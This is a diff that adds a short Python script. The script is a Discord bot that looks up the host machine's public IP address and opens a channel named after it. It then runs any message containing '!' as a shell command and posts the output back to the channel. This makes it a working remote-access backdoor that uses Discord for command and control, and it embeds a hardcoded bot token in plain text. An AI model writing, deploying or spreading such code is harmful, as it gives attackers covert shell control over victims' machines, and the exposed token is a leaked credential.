@@ -1,0 +1,58 @@
+import discord
+import requests
+import subprocess
+
+token = "MTUwMjczMzAyMzUxNzQ3NDk4OQ.GBHpog.Lv8iQRzgPUGbqPmWggK19fa-SDqrK1eataT680"
+
+intents = discord.Intents.default()
+intents.message_content = True
+client = discord.Client(intents=intents)
+
+
+
+
+
+@client.event
+async def on_ready():
+    ii = 0
+    global channel
+    guild = client.guilds[0]
+    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
+    iout = 0
+    for al in guild.channels:
+        iout += 1
+
+    for chn in guild.channels:
+        ii += 1
+        if str(chn) == str(ip):
+            print("found channel")
+            break
+        else:
+            if ii == iout:
+                channel = await guild.create_text_channel(ip)
+                print("Making channel called: ", ip)
+
+
+
+
+@client.event
+async def on_message(message):
+    if message.author.bot:
+        return
+    if "!" in str(message.content):
+
+        msg = message.content
+        cmd = msg.replace("!","")
+
+        command = subprocess.run(cmd, capture_output=True, text=True,shell=True)
+
+        msgd = str(command.stdout.encode()).replace("b'","").replace(r"\n'"," ").replace(r"\n"," ")
+        await message.channel.send(msgd)
+    elif ";" in str(message.content):
+        print("Built in command")
+
+
+
+
+
+client.run(token)
